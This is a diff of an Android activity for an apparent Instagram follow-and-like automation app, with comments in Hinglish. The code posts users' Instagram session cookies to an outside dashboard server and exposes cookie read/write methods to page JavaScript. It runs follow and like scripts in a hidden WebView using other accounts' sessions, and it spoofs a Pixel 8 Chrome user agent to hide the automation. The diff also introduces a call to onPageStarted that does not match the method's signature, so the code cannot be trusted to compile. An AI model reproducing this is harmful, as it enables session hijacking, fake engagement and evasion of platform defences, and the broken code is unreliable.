@@ -28,17 +28,17 @@ import android.widget.FrameLayout;
 
 import org.json.JSONObject;
 
-
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 
 public class MainActivity extends Activity {
-    private static final String APP_SECRET_KEY = "brohu2580";
-    // APP VERSION: har naye APK me ise badhao (2, 3, 4...). Server ka min_version_code isse compare hota hai.
-    private static final int APP_VERSION_CODE = 2;
-    // Secret + version wala user agent: SIRF apni website ke liye
-    // onCreate me phone ke asli WebView user agent se set hota hai
-    private String USER_AGENT_APP = "";
+
     private WebView mainWebView;
     private WebView workerWebView;
     private WebView searchWebView;
@@ -48,9 +48,11 @@ public class MainActivity extends Activity {
     private static final String HOSTING_DASHBOARD = HOSTING_BASE + "index.php";
     private static final String IG_URL = "https://www.instagram.com";
     private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
-    // Normal user agent (bina secret ke): Instagram wale pages ke liye
-    // onCreate me phone ke asli WebView user agent se set hota hai (nakli Pixel 8 string hata di)
-    private String USER_AGENT = "";
+
+    // Security Secret Key & Version Code Enforcer
+    private static final String APP_SECRET_KEY = "brohu2580";
+    private static final int APP_VERSION_CODE = 2; // Naya APK version code
+    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 " + APP_SECRET_KEY + " v/" + APP_VERSION_CODE;
 
     private static final String CHANNEL_ID = "upfollow_automation_channel";
     private static final int NOTIFICATION_ID = 1001;
@@ -63,9 +65,6 @@ public class MainActivity extends Activity {
     private volatile String mainUrl = "";
     private String deviceKey = "";
 
-    // Main WebView ka abhi kaun sa user agent laga hai
-    private String currentMainUa = "";
-
     private String currentTaskType = "follow";
     private boolean taskActive = false;
 
@@ -74,7 +73,6 @@ public class MainActivity extends Activity {
     private boolean addMode = false;
     private String captureNonce = "";
     private String captureCookies = "";
-
 
     private final Runnable taskTimeout = new Runnable() {
         @Override
@@ -87,16 +85,6 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        // Phone ka asli WebView user agent (Instagram ko mismatch na dikhe)
-        String baseUa = WebSettings.getDefaultUserAgent(this);
-        if (baseUa == null) baseUa = "";
-        // "wv" aur "Version/4.0" markers hata do, taaki normal Chrome jaisa dikhe
-        baseUa = baseUa.replace("; wv", "").replace(" Version/4.0", "");
-        USER_AGENT = baseUa;
-        USER_AGENT_APP = USER_AGENT + " " + APP_SECRET_KEY + " UFV/" + APP_VERSION_CODE;
-        currentMainUa = USER_AGENT_APP;
-
         setContentView(R.layout.activity_main);
 
         deviceKey = computeDeviceKey();
@@ -116,8 +104,7 @@ public class MainActivity extends Activity {
         }
 
         mainWebView = findViewById(R.id.webView);
-        // Main WebView: shuru me secret key + version wala user agent (website ke liye)
-        setupWebView(mainWebView, USER_AGENT_APP);
+        setupWebView(mainWebView);
 
         // Worker WebView: full-size, main WebView ke neeche chhupa hua
         workerWebView = new WebView(this);
@@ -179,7 +166,7 @@ public class MainActivity extends Activity {
 
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
-                super.onPageStarted(view, url, favicon);
+                super.onPageStarted(view, url);
                 mainUrl = url == null ? "" : url;
             }
 
@@ -187,21 +174,6 @@ public class MainActivity extends Activity {
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
                 if (url != null) mainUrl = url;
-
-                // Safety net (back button / redirect ke baad user agent galat reh jaye to sahi karo)
-                if (url != null) {
-                    if (url.startsWith(IG_URL) && !USER_AGENT.equals(currentMainUa)) {
-                        setMainUa(USER_AGENT);
-                        view.reload();
-                        return;
-                    }
-                    if (url.startsWith(HOSTING_BASE) && !USER_AGENT_APP.equals(currentMainUa)) {
-                        setMainUa(USER_AGENT_APP);
-                        view.reload();
-                        return;
-                    }
-                }
-
                 checkInstagramLogin(url);
             }
         });
@@ -255,31 +227,20 @@ public class MainActivity extends Activity {
             }
         });
 
-        // App start: hamesha dashboard (server decide karta hai: dashboard / saved accounts / login)
-        mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
+        // App start: Dashboard load karte waqt Version code (?v=2) aur Device Key dono pass honge
+        mainWebView.loadUrl(HOSTING_DASHBOARD + "?v=" + APP_VERSION_CODE + "&dk=" + deviceKey);
     }
 
-    // Normal WebView (Instagram wale): bina secret key ke user agent
     private void setupWebView(WebView wv) {
-        setupWebView(wv, USER_AGENT);
-    }
-
-    private void setupWebView(WebView wv, String ua) {
         WebSettings s = wv.getSettings();
         s.setJavaScriptEnabled(true);
         s.setDomStorageEnabled(true);
         s.setDatabaseEnabled(true);
-        s.setUserAgentString(ua);
+        s.setUserAgentString(USER_AGENT);
 
         CookieManager cm = CookieManager.getInstance();
         cm.setAcceptCookie(true);
         cm.setAcceptThirdPartyCookies(wv, true);
-    }
-
-    // Main WebView ka user agent badalne ke liye
-    private void setMainUa(String ua) {
-        currentMainUa = ua;
-        mainWebView.getSettings().setUserAgentString(ua);
     }
 
     // ------------------------------------------------------------------
@@ -300,7 +261,7 @@ public class MainActivity extends Activity {
     }
 
     // ------------------------------------------------------------------
-    // Navigation: "Add Account" link + user agent switching
+    // Navigation: "Add Account" link ko yaha pakadte hain
     // ------------------------------------------------------------------
     private boolean handleNav(final String url) {
         if (url != null && url.contains("force_authentication=1")) {
@@ -309,36 +270,8 @@ public class MainActivity extends Activity {
                 public void run() {
                     addMode = true;
                     captureBusy = false;
-                    // Saare accounts ki cookies server par saved hain, isliye jar saaf karna safe hai.
-                    // Isse Instagram naya login form dikhata hai aur purana session nahi ghusta.
                     applyInstagramCookies("");
-                    // Instagram ko secret key nahi dikhani: normal user agent lagao
-                    setMainUa(USER_AGENT);
                     mainWebView.loadUrl(IG_LOGIN_URL);
-                }
-            });
-            return true;
-        }
-        // Instagram khul raha hai to normal user agent (secret key chhupi rahe)
-        if (url != null && url.startsWith(IG_URL) && !USER_AGENT.equals(currentMainUa)) {
-            final String target = url;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    setMainUa(USER_AGENT);
-                    mainWebView.loadUrl(target);
-                }
-            });
-            return true;
-        }
-        // Website par wapas aa rahe hain to secret key wala user agent
-        if (url != null && url.startsWith(HOSTING_BASE) && !USER_AGENT_APP.equals(currentMainUa)) {
-            final String target = url;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    setMainUa(USER_AGENT_APP);
-                    mainWebView.loadUrl(target);
                 }
             });
             return true;
@@ -384,7 +317,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // Agar username fetch atak jaye to bina username ke aage badho
         uiHandler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -399,8 +331,6 @@ public class MainActivity extends Activity {
         if (!captureBusy) return;
         captureBusy = false;
         captureNonce = "";
-        // Website par wapas jaane se pehle secret key + version wala user agent dobara lagao
-        setMainUa(USER_AGENT_APP);
         try {
             String clean = username == null ? "" : username.replaceAll("[^A-Za-z0-9._]", "");
             String body = "ig_cookies=" + URLEncoder.encode(captureCookies, "UTF-8")
@@ -411,7 +341,7 @@ public class MainActivity extends Activity {
             mainWebView.postUrl(HOSTING_DASHBOARD, body.getBytes("UTF-8"));
         } catch (Exception e) {
             addMode = false;
-            mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
+            mainWebView.loadUrl(HOSTING_DASHBOARD + "?v=" + APP_VERSION_CODE + "&dk=" + deviceKey);
         }
     }
 
@@ -430,7 +360,6 @@ public class MainActivity extends Activity {
         return "";
     }
 
-    // cookieStr khali ho to sirf Instagram cookies clear hoti hain
     private void applyInstagramCookies(String cookieStr) {
         CookieManager cm = CookieManager.getInstance();
         String existing = cm.getCookie(IG_URL);
@@ -559,7 +488,7 @@ public class MainActivity extends Activity {
     }
 
     // ------------------------------------------------------------------
-    // LIKE SCRIPT: pehle DOM button, na mile to Instagram web API (fallback)
+    // LIKE SCRIPT
     // ------------------------------------------------------------------
     private void injectLikeScript(WebView view) {
         String script = JS_HEAD + js(
@@ -637,9 +566,7 @@ public class MainActivity extends Activity {
     }
 
     // ------------------------------------------------------------------
-    // LIVE PROFILE SEARCH (followers.php target search)
-    // Alag hidden WebView use hota hai, taaki running task disturb na ho.
-    // Pehle Instagram API, fail ho to profile page ke meta tags se data nikalta hai.
+    // LIVE PROFILE SEARCH
     // ------------------------------------------------------------------
     private boolean searchRunning = false;
 
@@ -701,24 +628,22 @@ public class MainActivity extends Activity {
             "    out({ success: true, username: r.username || U, full_name: r.full_name || '', numeric_id: '' + (r.pk || ''),",
             "          follower_count: r.fc, followers_formatted: fmt(r.fc) + ' followers', is_verified: !!r.verified, profile_pic: r.pic || '' });",
             "  }",
-            // ---- Strategy 1: web_profile_info API (kisi bhi 2xx status ko accept karta hai) ----
             "  function tryApi() {",
             "    return fetch('/api/v1/users/web_profile_info/?username=' + encodeURIComponent(U), { credentials: 'include', headers: H })",
             "    .then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
             "    .then(function(x) {",
             "      try {",
             "        var d = JSON.parse(x.t);",
+            "        if (d && (d.message === 'login_required' || d.require_login)) return { err: 'login' };",
             "        var u = (d.data && d.data.user) ? d.data.user : (d.user || null);",
             "        if (u && u.username) {",
             "          var fc = (u.edge_followed_by && u.edge_followed_by.count !== undefined) ? u.edge_followed_by.count : (u.follower_count || 0);",
             "          return { username: u.username, full_name: u.full_name, pk: u.id || u.pk, fc: fc, verified: u.is_verified, pic: u.profile_pic_url_hd || u.profile_pic_url };",
             "        }",
-            "        if (d && (d.message === 'login_required' || d.require_login)) return { err: 'login' };",
             "      } catch (e) {}",
             "      return null;",
             "    }).catch(function() { return null; });",
             "  }",
-            // ---- Strategy 2: profile page ke meta tags (og:description me followers) ----
             "  function tryHtml() {",
             "    return fetch('/' + encodeURIComponent(U) + '/', { credentials: 'include', headers: { 'Accept': 'text/html' } })",
             "    .then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
@@ -766,7 +691,7 @@ public class MainActivity extends Activity {
     }
 
     // ------------------------------------------------------------------
-    // TARGET ACCOUNT KE POSTS + REELS (likes page ke liye)
+    // TARGET ACCOUNT KE POSTS + REELS
     // ------------------------------------------------------------------
     private String pendingPostsUser = null;
     private boolean postsRunning = false;
@@ -1055,7 +980,6 @@ public class MainActivity extends Activity {
     // ------------------------------------------------------------------
     public class MainAppInterface {
 
-        // Naya: account ki cookies ke saath task chalao (har account apna session use karta hai)
         @JavascriptInterface
         public void runTask(final String target, final String taskType, final String mediaId, final String cookieStr) {
             if (!trusted()) return;
@@ -1089,7 +1013,6 @@ public class MainActivity extends Activity {
             });
         }
 
-        // Purana method (compatibility)
         @JavascriptInterface
         public void executeBrowserAction(String target, String taskType, String mediaId) {
             runTask(target, taskType, mediaId, "");
@@ -1100,8 +1023,6 @@ public class MainActivity extends Activity {
             runTask(target, "follow", "", "");
         }
 
-        // Primary account ki cookie server par sync karne ke liye
-        // Likes page: target account ke posts + reels (thumbnail, likes, code)
         @JavascriptInterface
         public void fetchInstagramPostsLive(final String queryUsername) {
             if (!trusted()) return;
@@ -1119,7 +1040,6 @@ public class MainActivity extends Activity {
             });
         }
 
-        // Jar me koi Instagram session na ho to dashboard primary ka session laga deta hai
         @JavascriptInterface
         public void applySession(final String cookieStr) {
             if (!trusted() || cookieStr == null || cookieStr.isEmpty()) return;
@@ -1153,12 +1073,6 @@ public class MainActivity extends Activity {
             if (!trusted()) return "";
             String c = CookieManager.getInstance().getCookie(IG_URL);
             return c == null ? "" : c;
-        }
-
-        // Website ko app ka version batane ke liye (optional use)
-        @JavascriptInterface
-        public int getAppVersion() {
-            return APP_VERSION_CODE;
         }
 
         @JavascriptInterface
@@ -1205,7 +1119,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // Instagram page se sirf username lene ke liye (nonce ke bina kaam nahi karta)
     public class IgProbeInterface {
         @JavascriptInterface
         public void onIgInfo(final String nonce, final String username) {
@@ -1249,4 +1162,4 @@ public class MainActivity extends Activity {
         }
         super.onDestroy();
     }
-}
+                                             }
